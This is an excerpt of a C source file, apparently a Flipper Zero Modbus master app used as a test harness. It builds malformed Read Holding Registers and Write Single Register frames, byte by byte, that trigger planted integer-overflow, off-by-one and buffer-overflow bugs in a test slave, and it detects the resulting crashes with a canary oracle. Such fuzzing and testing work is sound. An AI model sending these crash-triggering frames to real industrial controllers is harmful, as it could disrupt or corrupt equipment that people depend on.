...
/* 
 * ####################################################################################################
 * Construct a malformed FC=0x03 request that triggers Bug 2 (integer overflow in response buffer).
 * ----------------------------------------------------------------------------------------------------
 * Send a large quantity value that passes the weakened validation (quantity > 250)
 * but causes buffer overflow when building the response.
 * Send startAddr=0x0000, quantity=0x00FA (250).
 * The response builder allocates pdu[253] but tries to write to pdu[3 + 249*2] = pdu[501].
 * This overflows the stack buffer and corrupts the canary.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static size_t modbus_build_integer_overflow_request(uint8_t* buffer, uint8_t slave_id) {
    
    buffer[0] = slave_id;
    buffer[1] = 0x03;       // Function Code 3: Read Holding Registers
    buffer[2] = 0x00;       // start address high
    buffer[3] = 0x00;       // start address low (address 0x0000)
    buffer[4] = 0x00;       // quantity high
    buffer[5] = 0xFA;       // quantity low = 0xFA (250 decimal)
                            // Validator checks quantity > 250? No (250 > 250 is false), so it passes.
                            // Response loop writes pdu[3 + 249*2] = pdu[501], overflowing pdu[253].
...
/* 
 * ####################################################################################################
 * Construct a malformed FC=0x06 request that triggers Bug 3 (off-by-one error).
 * ----------------------------------------------------------------------------------------------------
 * Off-by-one in address validation. Correct check is addr >= NUM_REGISTERS.
 * The vulnerable check is addr > NUM_REGISTERS, allowing addr=10 to pass.
 * Writing to holdingRegisters[10] corrupts the canary immediately.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static size_t modbus_build_off_by_one_request(uint8_t* buffer, uint8_t slave_id) {
    
    buffer[0] = slave_id;
    buffer[1] = 0x06;       // Function Code 6: Write Single Register
    buffer[2] = 0x00;       // address high
    buffer[3] = 0x0A;       // address low = 0x0A (address 10, out of bounds)
    buffer[4] = 0x11;       // value high
    buffer[5] = 0x11;       // value low (0x1111 as payload)
...
static void modbus_app_draw_callback(Canvas* canvas, void* context) {
    ...
    canvas_draw_str(canvas, 2, 64, "OK=V L=Inv U=B1 R=B2 D=B3");
}
...
int32_t modbus_master_v2_app(void* p) {
    UNUSED(p);
        ...
        if(furi_message_queue_get(event_queue, &event, 100) == FuriStatusOk) {
            if(event.type == InputTypePress) {
                if(event.key == InputKeyBack) {
                    running = false;
                } else if(event.key == InputKeyOk || event.key == InputKeyLeft || event.key == InputKeyUp || event.key == InputKeyRight || event.key == InputKeyDown) {
                    state->response_len = 0;
                    ...
                    if(event.key == InputKeyOk) {                               
                        ...
                        state->last_request_type = "Bug1-BOF";
                    }
                    else if(event.key == InputKeyRight) {
                        request_len = modbus_build_integer_overflow_request(request, MODBUS_SLAVE_ID);
                        state->last_request_type = "Bug2-IntOvf";
                    }
                    else {
                        request_len = modbus_build_off_by_one_request(request, MODBUS_SLAVE_ID);
                        state->last_request_type = "Bug3-OBO";
                    }
                    ...
                    if(event.key == InputKeyUp || event.key == InputKeyRight || event.key == InputKeyDown) {
                        // ── Two-step oracle for all bug triggers (Up=Bug1, Right=Bug2, Down=Bug3) ──────────────
                        // Step 1: drain any partial response from the crash.
                        furi_delay_ms(300);
                        state->response_len = 0;
